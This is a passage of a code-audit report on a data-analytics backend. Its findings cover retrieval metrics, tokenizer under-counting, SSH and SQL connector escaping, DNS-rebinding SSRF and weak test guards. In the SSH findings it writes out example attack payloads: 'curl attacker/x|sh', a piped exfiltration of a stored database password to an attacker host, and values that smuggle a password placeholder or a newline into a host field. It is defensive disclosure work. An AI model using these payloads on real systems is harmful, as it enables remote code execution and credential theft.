- **What is wrong**: the comment justifies `reason="empty_cause_unknown"` with "the dense leg has no cause channel yet (a missing collection and a query that matched nothing both surface as `[]`)". That was true before `chroma_max_distance` was wired: there is now a third cause, created inside `_run_chroma` itself, and it is the one that fires. `_run_chroma` knows `len(hits)` before filtering and `len(filtered)` after, and discards both. This is the mirror of the F-KNOW-07 fix that gave BM25 real causes (`no_snapshot`/`corrupt`/`schema_mismatch`/`score_error`) — the dense side kept the unusable label, so `retrieval_degraded_total{leg="dense"}` again proves nothing.
- **Concrete failure**: a query where the store returned 40 neighbours and the 0.45 filter dropped all 40 is reported identically to one against a project with no vectors at all. The two need opposite fixes (retune the threshold vs. re-index), and the metric cannot tell an operator which.
- **Evidence**: `_run_chroma` returns a bare `list`, not a `(list, reason)` tuple as `_run_bm25` does (`hybrid_retriever.py:213-230` vs `:232-270`), so the cause has nowhere to travel even though it is computed.
- **Severity**: medium — no wrong answers on its own, but it is what makes RET-01 undiagnosable from telemetry.
- **Confidence**: certain.

---

## RET-07 — the tokenizer fallback under-counts code tokens by up to 67%, and the chunk it lets through carries no truncation signal

*`RET` — Retrieval*

- **Where**: `backend/app/knowledge/tokenizer_window.py:28-32` and `:164-167` (`_fallback_count`), `:169-179` (`_truncate_fallback`); consumed at `backend/app/knowledge/chunker.py:108` and `backend/app/knowledge/code_symbol_chunker.py:102-104`.
- **What is wrong**: the module claims the `ceil(len(text)/3)` fallback "means we always over-estimate token count (safe: chunks stay *within* the window …)" and "never under-counts". That is false for punctuation- and regex-dense source, where WordPiece emits far more than one token per three characters. The fallback activates silently whenever `Tokenizer.from_pretrained` fails — `tokenizers` reaches the HuggingFace hub on first use and `_get_tokenizer` swallows every failure into `logger.debug` (`:154-161`). When it is active, `chunk_document`'s fast path (`chunker.py:108`) and `build_code_chunks`' fast path (`code_symbol_chunker.py:102`) emit a single chunk with `chunk_index="0"` and **no** `truncated` flag, because the estimate says it fits. The embedder then truncates at 256 tokens and nothing records it.
- **Concrete failure**: 513 800-character slices of `app/knowledge/*.py`. The fallback under-counts on **50 of 513**; worst case `entity_extractor.py`, 800 chars → estimate 267 tokens, real **447** (real is 167% of the estimate). At `embedder_max_tokens = 256` such a chunk is admitted whole and loses ~43% of its content to the embedder, while `metadata["truncated"]` is absent, so `data_gate`/the caveat layer cannot say so. `_truncate_fallback` has the same error: `max_chars = 256 * 3 = 768` chars can be 447 real tokens.
- **Evidence**:
  ```
  samples: 513
  fallback UNDER-counts on 50 / 513 samples
     entity_extractor.py  chars= 800 est= 267 real= 447  real/est=1.67
     entity_extractor.py  chars= 800 est= 267 real= 418  real/est=1.57
     cross_source.py      chars= 800 est= 267 real= 366  real/est=1.37
  worst ratio: real is 167% of the estimate
  ```
  (real counts from `tokenizers.Tokenizer.from_pretrained("sentence-transformers/all-MiniLM-L6-v2")` with `no_truncation()`/`no_padding()` applied exactly as `tokenizer_window.py:149-152` does.)
- **Severity**: medium — the blast radius is bounded by how often the tokenizer load fails, but the loss is exactly the class CLAUDE.md documents as costing 28.9% of the index in the 512-vs-256 incident, and this path reproduces it without the log line that made that one findable.
- **Confidence**: certain that the fallback under-counts and that the resulting chunk carries no flag. Needs verification whether the HF tokenizer resolves on the production dyno — settle it by grepping the boot log for `tokenizer_window: loaded real tokenizer`, which is currently `logger.debug` and therefore invisible.

---

## RET-09 — the eval's nDCG normalises against what was retrieved, not against what exists, so it cannot see a recall regression

*`RET` — Retrieval*

- **Where**: `backend/app/eval/retrieval_metrics.py:69-80`, threshold at `backend/app/eval/harness.py:50` (`ndcg_at_k: float = 0.50`).
- **What is wrong**: `ideal_hits = min(k, sum(1 for d in top if is_relevant(d))) or 1` computes the ideal DCG from the relevant documents **present in the returned top-k**, not from the case's labelled relevant set. The metric therefore self-normalises: any retriever that puts its hits at the front scores 1.0 regardless of how many labelled documents it missed. The docstring calls it "Binary nDCG@k (ideal DCG assumes all top slots are relevant)", which describes the code but not the property a gate needs.
- **Concrete failure**: a golden case with 5 relevant ids, retriever returns `["r1", x, x, x, x, x, x, x, x, x]` — one of five, at rank 1. The implemented metric returns **1.0**; standard nDCG@10 returns **0.339**; `context_recall` correctly returns 0.2. A change that cut recall from 5/5 to 1/5 moves `ndcg_at_k` by zero, so its 0.50 floor is free and only `context_recall` (floor 0.60) can catch it.
- **Evidence**:
  ```
  ndcg all 5 relevant retrieved : 1.0
  ndcg only 1 of 5, at rank 1   : 1.0
  standard nDCG@10 for that case: 0.339
  recall for that case          : 0.2
  ```
  (run against `app.eval.retrieval_metrics.ndcg_at_k` directly.) Related, non-blocking: `context_recall` takes an `is_relevant` predicate at `:47-51` and never uses it — recall is computed purely by substring against `relevant_ids`.
- **Severity**: medium — one of four regression floors is inert, and it is the one whose name implies it measures ranking quality across the whole relevant set.
- **Confidence**: certain.

---

## SQL-05 — `format_template`'s shell escaping passes a trailing newline through unquoted, and re-substitutes placeholders found *inside* config values, leaking the DB password into the remote command line

*`SQL` — Connectors, SQL safety, SSH*

- **Where**: `backend/app/connectors/exec_templates.py:167` (`_SHELL_SAFE_RE`), `:170-180` (`_shell_escape`), `:206-214` (the substitution loop)
- **What is wrong**: two independent escaping defects. (a) `_SHELL_SAFE_RE = re.compile(r"^[a-zA-Z0-9._@/:=-]+$")` — Python's `$` also matches immediately before a trailing newline, so `"10.0.0.5\n"` is classified as shell-safe and returned unquoted. (b) The loop substitutes each key into `result` and then re-scans `result` for the next key, so a value that *is* a placeholder string gets expanded on a later iteration. `db_host` is a free 255-char string (`connections.py:389`, no pattern), and `check_connection_host` accepts an unresolvable host when `connection_allow_private_hosts` is `True` (the default, `config.py:296`), so `{db_password}` is storable as a host.
- **Concrete failure**: set `db_host` to the literal `{db_password}` on an ssh-exec connection. The command becomes `psql -h 'SUPERSECRET' -p 5432 …` — the decrypted database password in argv on the bastion, readable by any user there via `ps` / `/proc/<pid>/cmdline`. That is exactly the exposure F-SSH-02 rewrote `_build_command` to eliminate, reintroduced through a config field. Separately, `db_host = "10.0.0.5\n"` splits the remote command in two at the newline.
- **Evidence** (both run against the repo):
  ```
  _shell_escape("10.0.0.5\n")  -> '10.0.0.5\n'      # unquoted, newline intact
  format_template(EXEC_TEMPLATES["postgres"]["query"],
                  {"db_host":"{db_password}", ..., "db_password":"SUPERSECRET", ...})
  -> PGPASSWORD="$DBPASS" psql -h 'SUPERSECRET' -p 5432 -U u -d d -A -F $'\t' --pset footer=off
  ```
- **Severity**: **medium** — credential disclosure to co-tenants of the bastion; requires `owner` on the project to set `db_host`, which is why it is not high.
- **Confidence**: certain (measured). Fix is `shlex.quote` plus a single-pass `str.format_map`, or `\Z` instead of `$`.

---

## SQL-06 — The `ssh_pre_commands` allowlist protects nothing, because `ssh_command_template` sits in the same shell line with no validation at all

*`SQL` — Connectors, SQL safety, SSH*

- **Where**: guard at `backend/app/connectors/ssh_pre_commands.py:61-118`, applied at `ssh_exec.py:91`; the unvalidated field at `ssh_exec.py:69-70` and `connections.py:397` / `:479`
- **What is wrong**: F-SEC-5 hardened `ssh_pre_commands` thoroughly — count cap, length cap, a metacharacter screen that rejects `` ` ``, `$(`, `;`, `&`, `|`, `<`, `>`, newlines, and a four-shape allowlist — and re-validates at the exec layer as defence in depth. `ssh_command_template` is joined into the *same* `&& `-separated shell line by `_prepend_pre_commands`, is returned straight from config by `_get_template` with no validation whatsoever, and carries only a `max_length=2048` Pydantic bound. A control that can be stepped around by moving the payload one field over is not a control; the asymmetry also means the module docstring's threat model ("any shell metacharacter or arbitrary binary in a pre-command runs verbatim on the tunnel host") is left fully open on the adjacent field.
- **Concrete failure**: `PATCH /api/connections/{id}` with `ssh_pre_commands: ["curl attacker/x|sh"]` → 422, `PreCommandValidationError`. The same request with `ssh_command_template: "curl attacker/x|sh"` → 200, and the payload runs on the next `test_connection` or query. Combined with SQL-05(b), a template of `echo {db_password} | curl -d @- attacker` exfiltrates the stored credential.
- **Evidence**:
  ```python
  # ssh_exec.py:67-80 — no validation on this branch
  def _get_template(self, kind: str) -> str:
      if kind == "query" and self._config and self._config.ssh_command_template:
          return self._config.ssh_command_template
  # ssh_exec.py:89-92
  if pre:
      validate_pre_commands(pre)              # the guarded half
      return " && ".join(pre) + " && " + cmd  # the unguarded half
  ```
- **Severity**: **medium** — restricted to project `owner` (`connections.py:773`), and the owner supplies the SSH key, so on a single-owner project this is self-harm. It is a real boundary crossing on a project with several owners, and the inconsistency will mislead the next reader into trusting the pre-command guard.
- **Confidence**: certain.

---

## SQL-07 — `check_connection_targets` runs only at create/update, so the DNS-rebinding attack its own docstring names is unmitigated

*`SQL` — Connectors, SQL safety, SSH*

- **Where**: `backend/app/connectors/host_guard.py:189-214`; the only two call sites are `backend/app/api/routes/connections.py:711` and `:861`. No connector, no `SSHTunnelManager.get_or_create`, no `to_config` calls it.
- **What is wrong**: the module opens by stating that both checks "resolve DNS and check **every** address returned, because `db.attacker.test` may resolve to a public address in the operator's check and a private one a second later". That reasoning only holds if the check runs when the socket is opened. It runs once, at write time, and the value is then stored and reused by `SSHTunnel.start` (`ssh_tunnel.py:92`), by every connector's `connect()`, and by the health loop, none of which re-check.
- **Concrete failure**: on a deployment with `CONNECTION_ALLOW_PRIVATE_HOSTS=false` (the multi-tenant posture the guard exists for), a tenant creates a connection with `db_host=db.attacker.test`, whose A record is public at that instant — 200. They then repoint the record at `169.254.169.254` (or the operator's internal Redis, or `127.0.0.1`) with a short TTL and call `POST /api/connections/{id}/test`. The socket is opened to the internal address and the error text is the oracle the docstring describes. The `_METADATA_IPS` list, which the module calls "refused on every deployment, private-host setting or not", is never consulted on the path that actually connects.
- **Evidence**:
  ```
  $ grep -rn "host_guard\|check_connection_targets" app/
  app/api/routes/connections.py:22:  from app.connectors.host_guard import ...
  app/api/routes/connections.py:711: await check_connection_targets(
  app/api/routes/connections.py:861: await check_connection_targets(
  ```
  (Two call sites, both in the write routes; zero in `connectors/`.)
- **Severity**: **medium** — SSRF against internal services, gated on the operator having opted into strict mode and on the tenant controlling a DNS name.
- **Confidence**: certain for the call-site inventory; the exploit is standard DNS rebinding and would be settled by a test that creates a connection against a name resolving public, repoints it, and asserts `/test` refuses.

---

## SQL-08 — Sample rows, distinct values and column statistics are fetched by bare table name, so a non-`public` schema is sampled from the wrong table and same-named tables collide in the index

*`SQL` — Connectors, SQL safety, SSH*

- **Where**: `backend/app/knowledge/db_index_pipeline.py:592` (`connector.sample_data(table.name, limit=3)`), `:628` (`distinct_values`), `:662` / `:691` (`approx_stats`), keying at `:756-767`; quoting at `backend/app/connectors/base.py:463-467`, `:476-478`, `:490-495`, `:508-517`
- **What is wrong**: Postgres introspection deliberately returns **every** non-system schema (`postgres.py:308-311`, `WHERE t.table_schema NOT IN ('pg_catalog','information_schema')`) and populates `TableInfo.schema`. The pipeline then passes only `table.name`, and `DatabaseAdapter._quote_identifier` wraps it as a single identifier, so the query is `SELECT * FROM "events" LIMIT 3` — resolved against the session `search_path`, not against `analytics.events`. The legacy builders in the *same file* got this right (`:146-154`, `:306-307` both emit `"schema"."table"`); the T8/DBIDX-D1 change that routed through the connector methods to fix MongoDB dropped the schema qualification with them. The result dicts are keyed on bare `tname` too, so two schemas' same-named tables overwrite each other.
- **Concrete failure**: a database with `public.events` (a small lookup table) and `analytics.events` (the real fact table). Sampling `analytics.events` runs `SELECT * FROM "events" LIMIT 3`, silently returns `public.events` rows, and stores them as `analytics.events`'s samples, distinct values and `column_stats_json`. The LLM is then handed another table's values as ground truth for the one it is asked about. Where no same-named table exists in `public`, the query errors, `sample_failed` is set, and the table simply has no evidence — a degradation nobody can attribute. Line `:1023` in the same file keys on `f"{(t.schema or 'public')}.{t.name}"`, so the file already knows the schema is load-bearing.
- **Evidence**:
  ```python
  # db_index_pipeline.py:146-154 — the path that was replaced, schema-qualified
  if table.schema and table.schema != "public":
      tbl_name_q = f'"{table.schema}"."{table.name}"'
  # db_index_pipeline.py:592 — the live path, bare name
  result = await connector.sample_data(table.name, limit=3)
  # base.py:476-478
  quoted = self._quote_identifier(table_name)          # -> "events"
  return await self.execute_query(f"SELECT * FROM {quoted} LIMIT {limit}")
  ```
- **Severity**: **medium** — wrong data attributed to the wrong table in the context the agent reasons from; no security impact, but it is silent.
- **Confidence**: certain from the code; would be settled by indexing a Postgres database with the same table name in two schemas and reading `db_index.column_distinct_values_json`.

---

## SQL-09 — MongoDB results take their column list from the first document only, so fields that appear later are dropped without a truncation signal

*`SQL` — Connectors, SQL safety, SSH*

- **Where**: `backend/app/connectors/mongodb.py:292-296`
- **What is wrong**: `columns = list(capped[0].keys())` and then `rows = [[_to_jsonable(d.get(c)) for c in columns] for d in capped]`. MongoDB collections are heterogeneous by design — that is the point of the document model, and `_infer_fields` (`mongodb.py:78-124`) exists precisely because the connector knows this. Every field not present in document #1 is invisible in the result, and `d.get(c)` fills missing keys with `None`, so the loss is indistinguishable from a genuine null. Nothing sets `truncated` for it, so the honesty gates cannot caveat it.
- **Concrete failure**: `{"collection":"orders","operation":"find","filter":{}}` where the first order predates a schema change and has `{_id, total}` while later ones have `{_id, total, currency, refund_amount}`. The answer is computed over `total` alone; `currency` and `refund_amount` never reach the model, and a per-currency total is silently reported as a single-currency one. Reversed ordering of the same collection gives a different column set for the same query — the result depends on which document sorts first.
- **Evidence**:
  ```python
  # mongodb.py:292-296
  columns = list(capped[0].keys()) if capped else []
  rows = [[_to_jsonable(d.get(c)) for c in columns] for d in capped]
  ```
- **Severity**: **medium** — wrong answer, no signal. The union of keys across the returned documents (bounded by the row cap) is the obvious fix and is already implemented for introspection in `_infer_fields`.
- **Confidence**: certain.

---

## TEST-05 — the same guard passes while the number it exists to keep consistent is stated as 72% in two places a contributor actually reads

*`TEST` — Tests, CI gates, UX scenarios*

- **Where**: `/Users/sshlg/DATA/checkmydata-ai/backend/tests/unit/docs/test_coverage_gate_is_stated_once.py:59-70` (`test_claude_md_quotes_the_same_number`); the stale values live at `/Users/sshlg/DATA/checkmydata-ai/CLAUDE.md:998` and `/Users/sshlg/DATA/checkmydata-ai/CONTRIBUTING.md:139`
- **What is wrong**: The test matches exactly two phrasings — `coverage gate of (\d+)%` and ``` `fail_under` is \*\*(\d+)%\*\* ``` — and both currently yield 80. It never looks at `CONTRIBUTING.md` at all, and inside `CLAUDE.md` it misses the third statement of the same policy. The docstring says "a document quoting a threshold that has moved is the same defect as a board quoting a tally that has moved"; that defect is present right now, in the document the guard reads, and the guard is green.
- **Concrete failure**: This is not hypothetical — it is the current state. A contributor following `CONTRIBUTING.md` ships a PR that drops combined coverage to 74%, believing the floor is 72%, and CI fails at a threshold no document they read told them about. Additionally `ci.yml:76` still describes "the 72% floor".
- **Evidence**:
```
CLAUDE.md:84:   CI also runs a **coverage gate of 80%** …            <- matched by the guard
CLAUDE.md:998:  CI must be green; coverage must not drop below 72%.  <- not matched
CONTRIBUTING.md:139: - **Coverage**: Backend CI enforces ≥72% coverage. Don't decrease it.  <- file never read
.github/workflows/ci.yml:76:  # --cov-fail-under=0 disables per-step enforcement: the 72% floor is a
```
- **Severity**: medium — no production impact, but it is a live counter-example proving the guard's scope is too narrow.
- **Confidence**: certain.

---

## TEST-06 — the startup smoke suite is documented as a CI/boot gate and is executed by neither

*`TEST` — Tests, CI gates, UX scenarios*

- **Where**: `/Users/sshlg/DATA/checkmydata-ai/backend/tests/smoke/test_startup_smoke.py:4` and `backend/tests/smoke/README.md:5-6`; the runners are `.github/workflows/ci.yml:81` (`pytest tests/unit/`), `:93` (`pytest tests/integration/`), `:126` (three named eval files), and `/Users/sshlg/DATA/checkmydata-ai/Procfile`
- **What is wrong**: Six tests exercising the real `SafetyGuard`, `DataGate`, `_validate_plan_structure` and `route_request` against a seeded database claim to "run at server boot / in CI". CI runs three explicit path lists and none of them includes `tests/smoke`. The `Procfile` runs `alembic upgrade head && uvicorn` — nothing invokes pytest at boot. Only `make smoke` runs them, i.e. only when a human remembers. Nothing in `tests/unit/docs/` asserts which suites CI invokes, so deleting the "Integration tests" step would be equally invisible.
- **Concrete failure**: Break `SafetyGuard`'s read-only allow-list in a way the unit suite happens not to cover; `tests/smoke` would catch it (item 3 in its README) and never runs. More broadly, any future test placed outside `tests/unit/` and `tests/integration/` is dead on arrival.
- **Evidence**:
```
$ grep -rn "smoke" .github/ Procfile scripts/     # only a colour name in .github/skills/impeccable/scripts/palette.mjs
$ cat Procfile
web: cd backend && alembic upgrade head && uvicorn app.main:app --host 0.0.0.0 --port ${PORT:-8000}
worker: cd backend && arq app.worker.WorkerSettings
$ cd backend && pytest tests/smoke -m smoke -q
6 passed in 10.50s
```
- **Severity**: medium — six real checks exist and cost 10 s, and the documentation asserts they gate merges.
- **Confidence**: certain.

---

## TEST-07 — `TestTheFloorsAreFloors` claims to compare the floors against measured performance and only checks they are between 0 and 1

*`TEST` — Tests, CI gates, UX scenarios*

- **Where**: `/Users/sshlg/DATA/checkmydata-ai/backend/tests/unit/eval/test_real_retriever_eval.py:359-368`
- **What is wrong**: The test is named `test_they_are_below_what_the_real_retriever_measures`, takes the `bm25` fixture (building a full index), and never uses it. Its four assertions only establish that each threshold is a number in `(0, 1]`. It asserts nothing about the retriever, nothing about headroom, and nothing about the floors being meaningful — which is precisely what its docstring says it prevents ("one far below it catches nothing").
- **Concrete failure**: Set `EvalThresholds.hit_at_k = 0.01`, `mrr = 0.01`, `context_recall = 0.01`, `ndcg_at_k = 0.01` in `app/eval/harness.py:47-50`. Retrieval can then collapse to near-random and the CI eval gate at `ci.yml:126` still passes; this test — the only one that looks at the floors themselves — stays green.
- **Evidence**:
```python
359: class TestTheFloorsAreFloors:
360:     def test_they_are_below_what_the_real_retriever_measures(self, bm25):
364:         t = EvalThresholds()
365:         assert 0.0 < t.hit_at_k <= 1.0
366:         assert 0.0 < t.mrr <= 1.0
367:         assert 0.0 < t.context_recall <= 1.0
368:         assert 0.0 < t.ndcg_at_k <= 1.0
```
- **Severity**: medium — a tautology sitting on the thresholds of the project's only quality gate.
- **Confidence**: certain.

---

## TEST-08 — the Coverage-path existence check covers one of the three UX documents, and one of the unguarded two names a component that was deleted

*`TEST` — Tests, CI gates, UX scenarios*

- **Where**: guard at `/Users/sshlg/DATA/checkmydata-ai/backend/tests/unit/docs/test_ux_scenarios.py:30` (`SCENARIOS_MD = REPO_ROOT / "docs/ux/scenarios.md"`) and `:208-221`; the unguarded documents are `/Users/sshlg/DATA/checkmydata-ai/docs/ux/screens.md:18` and `:69`, and `docs/ux/flows.md`
- **What is wrong**: `test_new_scenario_coverage_paths_resolve` and `test_legacy_coverage_paths_do_not_regress` are hard-wired to `scenarios.md`. `screens.md` (SCR-01…SCR-10) and `flows.md` (FLW-01…FLW-05) were added 2026-09-07, carry 26 path references between them, and have **no** body/index pairing test, no path-existence test, no status/verdict test and no verification block. SCR-01's Coverage names `frontend/src/components/connections/ConnectionsPanel.tsx`, which does not exist — and `scenarios.md:848` states in prose that it was deleted. Nine of the ten screens (SCR-02…SCR-10) are referenced by no scenario's `Traces:` line, so nothing else links them to the base either.
- **Concrete failure**: Any component rename or deletion silently rots `screens.md` and `flows.md` while `make ux-status` and the whole `tests/unit/docs/` suite stay green — the exact failure the scenarios guard exists to prevent, reproduced one directory over.
- **Evidence**:
```
$ ls frontend/src/components/connections/
connection-form-helpers.ts  ConnectionHealth.tsx  ConnectionSelector.tsx  RailSourceList.tsx  SyncStatusIndicator.tsx
docs/ux/screens.md:18: | SCR-01 | Data workspace | … | drifted | frontend/src/components/connections/ConnectionsPanel.tsx |
docs/ux/screens.md:69: - **Coverage:** frontend/src/components/connections/ConnectionsPanel.tsx (the narrow wrapper this supersedes); …
docs/ux/scenarios.md:848: … ("Select a project first" — the state moved here when `ConnectionsPanel` was deleted)
$ python3 <scan>  →  docs/ux/screens.md: 26 path tokens, 1 unresolved
```
- **Severity**: medium — a live dangling reference plus a whole documentation layer outside every mechanical check.
- **Confidence**: certain.

---

## TEST-09 — three guards assert a literal source string, so a behaviour-preserving edit turns them red and a behaviour-destroying one leaves them green

*`TEST` — Tests, CI gates, UX scenarios*

- **Where**:
  - `/Users/sshlg/DATA/checkmydata-ai/backend/tests/unit/agents/test_layer_checker.py:292-296` — `src = inspect.getsource(stage_executor); assert "len(batch) > 1" in src`
  - `/Users/sshlg/DATA/checkmydata-ai/backend/tests/unit/knowledge/test_sync_vector_calls_do_not_block.py:189-191` — `assert src.count("to_thread") >= 2`
  - `/Users/sshlg/DATA/checkmydata-ai/backend/tests/unit/test_connection_budget_fits_the_pooler.py:53` — `assert "max(2, settings.db_pool_size // 2)" in src`
- **What is wrong**: Each takes the whole module's source as a string and greps it. The scan is not restricted to the function under test and does not strip comments or docstrings, so the token satisfies the assertion wherever it appears. Conversely the assertion is spelling-sensitive: `if len(batch) >= 2:`, `await asyncio.to_thread` refactored into one shared helper, or `max(2, settings.db_pool_size >> 1)` all fail while behaving identically.
- **Concrete failure**: For the first — delete the `len(batch) > 1` guard around the cross-layer checker in `stage_executor.py` and leave a comment reading `# the gate used to run only when len(batch) > 1`. The cross-item gate now runs (or does not) on every layer, and `test_it_is_consulted_only_for_a_layer_of_more_than_one` passes. For the second — replace both `asyncio.to_thread` wrappers in `hybrid_retriever.py` with direct synchronous calls, leaving the two explanatory comments that already name `to_thread`; the retriever blocks the event loop on both legs and `test_it_wraps_both_legs` passes.
- **Evidence**:
```python
# test_layer_checker.py
292:        src = inspect.getsource(stage_executor)
293:        assert "len(batch) > 1" in src, (
# test_sync_vector_calls_do_not_block.py
190:        src = Path("app/knowledge/hybrid_retriever.py").read_text(encoding="utf-8")
191:        assert src.count("to_thread") >= 2
```
  Note the same file at `:118-126` does this correctly, walking the AST with `_bare_blocking_calls` — the tooling for a real check is already in the file.
- **Severity**: medium — each guards a property with a real production incident behind it (loop starvation, an ungated convergence, pooler saturation).
- **Confidence**: certain.

---

## TEST-10 — the contrast test re-implements the alpha values it is testing, so the shipped opacity can drop below AA without failing

*`TEST` — Tests, CI gates, UX scenarios*

- **Where**: `/Users/sshlg/DATA/checkmydata-ai/frontend/src/__tests__/contrast.test.ts:110`, `:117`, `:129`; the values it duplicates live at `/Users/sshlg/DATA/checkmydata-ai/frontend/src/app/globals.css:84`, `:89`, `:238`, `:240`
- **What is wrong**: The file's premise is "contrast, computed from the token layer rather than asserted about it". It does read the *hex/oklch* tokens from `globals.css`, but its `parse()` helper (`:52-59`) only accepts `#hex` and `oklch(...)` and throws on `rgba(...)`/`rgb(from …)` — which is how `--ink-2` and `--muted` are actually declared. So the alphas were hardcoded into the test instead. The test now measures a composition the stylesheet no longer has to agree with.
- **Concrete failure**: Change `globals.css:89` from `rgb(from var(--ink) r g b / 0.55)` to `/ 0.35`. Every `text-text-tertiary` label in the product drops from 4.13:1 to roughly 2.4:1 — well under the 3.0 non-text floor the test claims to hold — and `contrast.test.ts` recomputes 0.55 and passes. The same applies to the 0.72/0.70 secondary-prose alpha and the 0.10/0.12 chip tints.
- **Evidence**:
```
frontend/src/__tests__/contrast.test.ts:117:    const alpha = theme === "light" ? 0.72 : 0.7;
frontend/src/__tests__/contrast.test.ts:129:    const alpha = theme === "light" ? 0.55 : 0.5;
frontend/src/app/globals.css:84:  --ink-2: rgb(from var(--ink) r g b / 0.72);
frontend/src/app/globals.css:89:  --muted: rgb(from var(--ink) r g b / 0.55);
```
- **Severity**: medium — the audit finding this file was written to close ("contrast is stated, not measured in situ") is only half-closed, and the half that is open is the one that changes most often.
- **Confidence**: certain.

---

## TEST-11 — two module-level `skipif` guards, left over from unmerged dependencies, silently delete whole test files if their target is renamed

*`TEST` — Tests, CI gates, UX scenarios*

- **Where**: `/Users/sshlg/DATA/checkmydata-ai/backend/tests/unit/test_sql_agent_result_gate.py:12-15` and `/Users/sshlg/DATA/checkmydata-ai/backend/tests/unit/test_data_processor.py:1176-1179`
- **What is wrong**: Both conditions ask whether a dependency exists — `importlib.util.find_spec("app.agents.result_validation") is None` and `not hasattr(_base, "derive_result")` — and skip on absence, with reasons that say "not merged yet — this task depends on W0". W0 shipped: `app/agents/result_validation.py` exists and both files run today. The guards are now pure downside: they turn "the thing this file tests was deleted or renamed" into a silent skip instead of a collection error. Nothing in `tests/unit/docs/` ratchets the skip count, and CI's pytest invocations do not pass `-rs` or `--strict-markers`, so a skip prints as a dot-equivalent in `-q` output.
- **Concrete failure**: Rename `app/agents/result_validation.py` (or drop the `ResultValidation` façade from the single-query path). DATA-06 — "single-query path runs the shared ResultValidation gate", the check that the SQL agent still validates its results — reports 0 tests instead of 4 failures, and the CI summary line moves from `N passed` to `N-4 passed, 4 skipped` with nothing calling attention to it.
- **Evidence**:
```python
# tests/unit/test_sql_agent_result_gate.py
12: pytestmark = pytest.mark.skipif(
13:     importlib.util.find_spec("app.agents.result_validation") is None,
14:     reason="W0 C-B/C-C ResultValidation not merged yet — this task depends on W0.",
15: )
```
```
$ ls backend/app/agents/result_validation.py   → exists
$ pytest tests/unit/test_sql_agent_result_gate.py -q → 4 passed
```
- **Severity**: medium — the skip converts a deletion of production behaviour into green CI.
- **Confidence**: certain.

---

## TEST-13 — `importlib.reload(app.main)` splits the FastAPI app into two live objects for the rest of the process

*`TEST` — Tests, CI gates, UX scenarios*

- **Where**: `/Users/sshlg/DATA/checkmydata-ai/backend/tests/unit/test_mcp_mount_wiring.py:9-27`
- **What is wrong**: Both tests reload `app.main` inside a settings patch and reload again to restore. Reload rebinds `app.main.app` to a **new** FastAPI instance; the six test modules that do `from app.main import app` at module scope bound the original during collection and keep it. `tests/integration/conftest.py:102` imports `app` *lazily inside the client fixture*, so it installs `dependency_overrides[get_db]` on whichever object is current. In `pytest tests/` (what `make test-all` and `make check` run) unit and integration share one process, so the override can land on a different object than the one a test module is driving. In CI they are two processes (`ci.yml:81`, `:93`), so CI never exercises this shape — `make check` and CI are not the same check. Separately, the restore reload at `:15`/`:27` sits after the assertion, so a failing assertion inside the `with` leaves the module permanently swapped for every later test in the session.
- **Concrete failure**: Add an integration test that binds `from app.main import app` at module scope and relies on the conftest DB override. Under `make check` it silently talks to the un-overridden session factory; under CI it passes. The reverse ordering produces a failure with no relationship to the change that caused it.
- **Evidence**:
```
$ python -c "import importlib, app.main as m; from app.main import app as e; \
             print(e is m.app); importlib.reload(m); print(e is m.app)"
True
False
```
```
tests/integration/conftest.py:102:    from app.main import app
tests/integration/conftest.py:110:    app.dependency_overrides[get_db] = _override
tests/integration/test_ws_auth.py:13: from app.main import app      # bound at collection
```
- **Severity**: medium — no failure today (`pytest tests/unit/test_mcp_mount_wiring.py tests/integration/test_ws_auth.py -q` → 6 passed), but it is an unguarded process-global mutation with no finalizer.
- **Confidence**: certain on the mechanism; needs-verification on whether any current test pair actually diverges — settled by running the full `pytest tests/` in one process and diffing against the two-process CI result.

---


# LOW


## ANA-08 — Two different required-field lists validate the same service-account JSON, so a key missing `token_uri` is accepted at paste and fails at collect time

*`ANA` — Analytics sources (GA4)*

- **Where**: `backend/app/services/vendor_credential_service.py:33` vs `backend/app/analytics/ga4/config.py:42`
- **What is wrong**: The credential store validates `("client_email", "private_key")`; the adapter that actually uses the credential validates `("client_email", "private_key", "token_uri")` and raises `AnalyticsAuthError` on the third. The store is the layer that can return a 422 while the user still has the file open; the adapter's failure surfaces hours later as a `_connect` sentinel row.
- **Concrete failure**: A service-account JSON that has been hand-edited or reassembled without `token_uri` saves successfully, shows a green fingerprint and a `client_email` in the Vendor Credentials panel, and the first scheduled collection fails with *"GA4 service-account credential is missing required field(s): token_uri"* — journalled under `_connect`, discoverable only in the collection status row. `docs/ANALYTICS_SOURCES.md:96-97` promises the opposite: *"The file must contain `client_email` and `private_key`, or the paste is rejected with a 422 naming the missing field."*
- **Evidence**:
```python
# vendor_credential_service.py:33
_GA4_REQUIRED_FIELDS: tuple[str, ...] = ("client_email", "private_key")
# analytics/ga4/config.py:42
_REQUIRED_SA_FIELDS = ("client_email", "private_key", "token_uri")
```
- **Severity**: low — a Google-issued key file always carries `token_uri`, so this fires only on a hand-modified paste.
- **Confidence**: certain. Two lists, one document, no shared constant.

---

## ANA-09 — The runbook documents a `_connect` bug that the code does not have

*`ANA` — Analytics sources (GA4)*

- **Where**: `docs/ANALYTICS_SOURCES.md:279-282` vs `backend/app/services/connection_service.py:915-917`
- **What is wrong**: The runbook carries a standing caveat telling operators that the `_connect` sentinel appears as a sixth row in `reports[]`. The code explicitly subtracts it.
- **Concrete failure**: An operator diagnosing a fresh GA4 connection looks for a `_connect` row in the per-report list, does not find one, and concludes the sentinel was never written — when in fact it is present in the journal and is driving the connection-level `status: "failed"` and `last_error` they are looking at.
- **Evidence** — doc:
> "…but `collection_status` builds `reports[]` from every report name in the journal, so the entry is currently **included**."

code:
```python
# connection_service.py:915-917
report_names = sorted(
    (set(grains) | {row.report for row in rows}) - {CONNECT_SENTINEL_REPORT}
)
```
- **Severity**: low — misleading documentation only; the behaviour is the correct one.
- **Confidence**: certain.

---

## API-12 — `POST /api/feed/{project_id}/scan` reports `connections_scanned` from its input, not from what succeeded

*`API` — HTTP routes and contracts*

- **Where**: `backend/app/api/routes/feed.py:76-91`
- **What is wrong**: The handler loops over every connection, swallows any per-connection exception into a `logger.warning`, and then returns `"connections_scanned": len(connection_ids)` — the length of the input list. A connection whose scan raised is counted as scanned, and the response carries no error field at all, unlike the single-connection sibling at `feed.py:38-42` which returns `"errors": result.errors[:5]`. This is the pattern the project already documents as a defect class ("Three claims computed from the input instead of the outcome, in a row", CLAUDE.md §0d).
- **Concrete failure**: A project with 5 connections, 4 of which have no DB index and raise. `POST /api/feed/p1/scan` returns `200 {"total_insights_created": 0, "total_insights_updated": 0, "connections_scanned": 5}` — indistinguishable from a clean run that genuinely found nothing.
- **Evidence**:
```python
# feed.py:76-91
    for conn_id in connection_ids:
        try:
